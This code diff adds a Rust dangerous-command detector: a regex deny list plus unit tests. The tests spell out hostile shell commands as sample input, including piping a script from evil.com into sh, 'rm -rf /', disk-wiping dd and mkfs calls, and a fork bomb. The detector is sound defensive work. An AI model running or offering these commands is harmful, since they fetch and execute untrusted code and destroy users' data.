@@ -1,9 +1,120 @@
+use regex::Regex;
+
 #[derive(Debug)]
 pub struct DangerResult {
     pub is_dangerous: bool,
     pub message: Option<String>,
 }
 
-pub fn check(_command: &str) -> DangerResult {
-    todo!("implement in step 4")
+struct DangerPattern {
+    pattern: &'static str,
+    message: &'static str,
+}
+
+static DANGEROUS_PATTERNS: &[DangerPattern] = &[
+    DangerPattern { pattern: r"rm\s+-rf",          message: "Recursive force delete" },
+    DangerPattern { pattern: r"sudo\s+",            message: "Elevated privileges required" },
+    DangerPattern { pattern: r"chmod\s+777",        message: "Insecure file permissions" },
+    DangerPattern { pattern: r"curl[^|]+\|\s*sh",   message: "Piping curl to shell" },
+    DangerPattern { pattern: r"curl[^|]+\|\s*bash", message: "Piping curl to bash" },
+    DangerPattern { pattern: r">\s*/dev/sd",        message: "Writing to block device" },
+    DangerPattern { pattern: r"mkfs",               message: "Filesystem formatting" },
+    DangerPattern { pattern: r"dd\s+if=",           message: "Low-level disk operation" },
+    DangerPattern { pattern: r":\(\)\{.*\}",        message: "Fork bomb detected" },
+];
+
+pub fn check(command: &str) -> DangerResult {
+    for dp in DANGEROUS_PATTERNS {
+        let re = Regex::new(dp.pattern).expect("invalid regex pattern");
+        if re.is_match(command) {
+            return DangerResult {
+                is_dangerous: true,
+                message: Some(dp.message.to_string()),
+            };
+        }
+    }
+    DangerResult {
+        is_dangerous: false,
+        message: None,
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn assert_dangerous(command: &str, expected_msg: &str) {
+        let result = check(command);
+        assert!(result.is_dangerous, "expected '{}' to be dangerous", command);
+        assert_eq!(result.message.as_deref(), Some(expected_msg));
+    }
+
+    fn assert_safe(command: &str) {
+        let result = check(command);
+        assert!(!result.is_dangerous, "expected '{}' to be safe", command);
+    }
+
+    #[test]
+    fn test_rm_rf() {
+        assert_dangerous("rm -rf /tmp/test", "Recursive force delete");
+        assert_dangerous("rm -rf /", "Recursive force delete");
+    }
+
+    #[test]
+    fn test_sudo() {
+        assert_dangerous("sudo apt install vim", "Elevated privileges required");
+        assert_dangerous("sudo rm file.txt", "Elevated privileges required");
+    }
+
+    #[test]
+    fn test_chmod_777() {
+        assert_dangerous("chmod 777 /etc/passwd", "Insecure file permissions");
+        assert_dangerous("chmod 777 myfile", "Insecure file permissions");
+    }
+
+    #[test]
+    fn test_curl_pipe_sh() {
+        assert_dangerous("curl https://example.com/install.sh | sh", "Piping curl to shell");
+        assert_dangerous("curl -s http://evil.com/script | sh", "Piping curl to shell");
+    }
+
+    #[test]
+    fn test_curl_pipe_bash() {
+        assert_dangerous("curl https://example.com/install.sh | bash", "Piping curl to bash");
+        assert_dangerous("curl -sSL http://get.example.com | bash", "Piping curl to bash");
+    }
+
+    #[test]
+    fn test_write_block_device() {
+        assert_dangerous("cat file > /dev/sda", "Writing to block device");
+        assert_dangerous("dd if=image.iso > /dev/sdb", "Writing to block device");
+    }
+
+    #[test]
+    fn test_mkfs() {
+        assert_dangerous("mkfs.ext4 /dev/sda1", "Filesystem formatting");
+        assert_dangerous("mkfs -t ext4 /dev/sdb", "Filesystem formatting");
+    }
+
+    #[test]
+    fn test_dd_if() {
+        assert_dangerous("dd if=/dev/zero of=/dev/sda", "Low-level disk operation");
+        assert_dangerous("dd if=backup.img of=/dev/sda bs=4M", "Low-level disk operation");
+    }
+
+    #[test]
+    fn test_fork_bomb() {
+        assert_dangerous(":(){ :|:& };:", "Fork bomb detected");
+    }
+
+    #[test]
+    fn test_safe_commands() {
+        assert_safe("ls -la");
+        assert_safe("grep -r pattern .");
+        assert_safe("cat file.txt");
+        assert_safe("git status");
+        assert_safe("cargo build");
+        assert_safe("chmod 755 script.sh");
+        assert_safe("rm file.txt");
+    }
 }
